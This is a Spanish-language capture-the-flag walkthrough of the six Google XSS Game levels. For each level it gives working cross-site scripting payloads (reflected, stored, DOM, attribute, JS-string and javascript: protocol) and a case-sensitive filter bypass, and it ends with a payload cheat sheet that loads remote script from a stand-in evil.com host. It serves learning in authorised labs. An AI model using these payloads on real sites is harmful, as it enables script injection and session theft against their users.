# 💉 XSS Levels — Walkthrough

> **Google XSS Game · Guía completa nivel por nivel** · Reflected · Stored · DOM-based

[![XSS](https://img.shields.io/badge/Tipo-Cross--Site%20Scripting-critical?style=flat-square)]()
[![Niveles](https://img.shields.io/badge/Niveles-6-blueviolet?style=flat-square)]()
[![Dificultad](https://img.shields.io/badge/Dificultad-Básico%20→%20Avanzado-orange?style=flat-square)]()
[![CTF](https://img.shields.io/badge/Plataforma-Google%20XSS%20Game-4285F4?style=flat-square&logo=google)]()

---

## 🗺️ Mapa de niveles

| # | Nombre | Tipo de XSS | Dificultad |
|---|--------|-------------|------------|
| 1 | Hello, world of XSS | Reflected (básico) | 🟢 Fácil |
| 2 | Persistence is key | Stored (persistente) | 🟡 Medio |
| 3 | That sinking feeling | DOM-based (sink oculto) | 🟡 Medio |
| 4 | Context matters | DOM via atributo `onload` | 🟠 Difícil |
| 5 | Breaking protocol | `javascript:` protocol | 🟠 Difícil |
| 6 | Follow the rabbit | Dynamic script loading | 🔴 Avanzado |

---

## Level 1 — Reflected XSS básico

**Qué pasa:** El input del usuario se inserta directo en el HTML sin escapar `< > " '`

### Payload
```html
<script>alert(1)</script>
```

### Vectores
```
# En campo de texto
<script>alert(1)</script>

# En la URL
http://target.com/?q=<script>alert(1)</script>

# Alternativa si <script> está bloqueado
<img src=x onerror=alert(1)>
```
![XSS1](https://github.com/user-attachments/assets/7bc9f9aa-c379-47c8-8295-4d3da7aad5b5)

**Lección:** Reflected XSS — se ejecuta una sola vez, entrada directa al DOM.

---

## Level 2 — Stored XSS (persistente)

**Qué pasa:** El input se guarda en DB/localStorage y se ejecuta **cada vez** que se renderiza la página.

### Payloads por contexto

```html
<!-- HTML normal → <div>INPUT</div> -->
<script>alert(1)</script>

<!-- Dentro de atributo → <input value="INPUT"> -->
" onfocus=alert(1) autofocus "

<!-- Dentro de JS → var x = "INPUT"; -->
";alert(1);//
```

### Dónde inyectar
- Post / comentario
- Username
- Perfil
- Mensajes

### Verificación
1. Envías el payload → se guarda
2. Recargas la página
3. 💥 `alert(1)` aparece automáticamente
![XSS2](https://github.com/user-attachments/assets/59f05e7d-8973-4291-8e09-6c1a8e0e1b3d)

**Lección:** Stored XSS — más peligroso. Permite robo de sesiones, keylogging, escalada a admin.

---

## Level 3 — DOM XSS (sink oculto)

**Qué pasa:** No hay input visible. La app lee `location.hash` y lo inyecta en un sink como `innerHTML`, `document.write` o `eval`.

```javascript
// Código vulnerable típico
var input = location.hash;
element.innerHTML = input;
```

### Payload en URL
```
# Básico
http://target.com/#<script>alert(1)</script>

# Sin <script>
http://target.com/#<img src=x onerror=alert(1)>
```
![XSS3](https://github.com/user-attachments/assets/f811c184-1918-4a93-a1af-ba2050cb75d0)

**Lección:** DOM-based XSS — el servidor nunca ve el payload, todo ocurre en el cliente.

---

## Level 4 — Contexto de atributo `onload`

**Qué pasa:** El parámetro `timer` se inserta dentro de `startTimer('...')` en un atributo `onload`.

```html
<!-- Código vulnerable -->
<img src="/static/loading.gif" onload="startTimer('TIMER_VALUE');" />
```

### Output de debug → pista
```
Your timer will execute in 3') seconds.
```
👉 Confirma inyección HTML, no JS string.

### Payload
```
');alert(1);//
```

### URL completa
```
https://xss-game.appspot.com/level4/frame?timer=');alert(1);//
```

### Resultado
```javascript
onload="startTimer('');alert(1);//');"
// startTimer('') → se ejecuta
// alert(1)       → 💥 XSS
// //             → comenta el resto
```

> **Tip CTF:** Si `alert` falla en iframe usa `prompt(1)` o `confirm(1)`.
> URL encode: `'` → `%27`, `;` → `%3b`, `/` → `%2f`
![XSS4](https://github.com/user-attachments/assets/f4cddb4b-62cb-4ec2-85fd-5f4bf835d2fd)

**Lección:** Context matters — identifica ANTES si tu input cae en JS string, HTML o DOM sink.

---

## Level 5 — Breaking protocol (`javascript:`)

**Qué pasa:** El parámetro `next` se inserta directamente en un `href` sin validación de protocolo.

```html
<!-- Código vulnerable -->
<a href="{{ next }}">Next >></a>
```

### Exploit
```
# URL modificada
.../signup?next=javascript:alert(1)
```

**Pasos:**
1. Carga la URL con el payload inyectado
2. Ingresa cualquier email
3. Haz clic en **"Next >>"**
4. 💥 `alert(1)` se ejecuta
![XSS5](https://github.com/user-attachments/assets/7c7aa36f-9c99-4d96-97cd-4a4672b30637)
![XSS5v2](https://github.com/user-attachments/assets/5b5aa55c-fe4c-4523-a553-56fcbd390111)

**Lección:** `javascript:` en `href` ejecuta código al hacer clic. También base de Open Redirect attacks.

---

## Level 6 — Dynamic script loading (bypass de filtro)

**Qué pasa:** La app carga scripts dinámicamente desde `location.hash`. El filtro bloquea `http://` y `https://` — pero es **case-sensitive**.

```javascript
// Filtro débil
if (url.match(/^https?:\/\//)) { /* bloqueado */ }
// HTTPS:// en mayúsculas → pasa el filtro
```

### Payload
```
#HTTPS://google.com/jsapi?callback=alert
```

**Cómo funciona:**
- `HTTPS://` (mayúsculas) → evade el regex
- `google.com/jsapi` → script legítimo y confiable
- `?callback=alert` → Google JSAPI ejecuta `alert()` como callback
![Finish](https://github.com/user-attachments/assets/6e18b3cc-de07-44c7-9ac7-093015178c81)

**Lección:** Filtros case-sensitive son bypasseables. Nunca confíes en regex sin flags `/i`.

---

## 🧠 Regla de oro — Context matters

| Tu input cae en... | Tipo de XSS | Payload |
|---|---|---|
| `<div>INPUT</div>` | HTML injection | `<script>alert(1)</script>` |
| `<input value="INPUT">` | Atributo HTML | `" onfocus=alert(1) autofocus "` |
| `var x = "INPUT";` | JS string | `";alert(1);//` |
| `element.innerHTML = INPUT` | DOM sink | `<img src=x onerror=alert(1)>` |
| `href="INPUT"` | Protocol injection | `javascript:alert(1)` |

---

## 🔧 Cheatsheet rápido

```html
<!-- Básicos -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Atributos -->
" onfocus=alert(1) autofocus "
' onmouseover=alert(1) '

<!-- JS string break -->
';alert(1);//
");alert(1);//

<!-- Protocol -->
javascript:alert(1)

<!-- Bypass case-sensitive -->
HTTPS://evil.com/payload.js
```

---

## ⚠️ Legal

Solo para uso en entornos autorizados (CTFs, labs, bug bounty con scope definido). El uso en sistemas sin permiso explícito es ilegal.
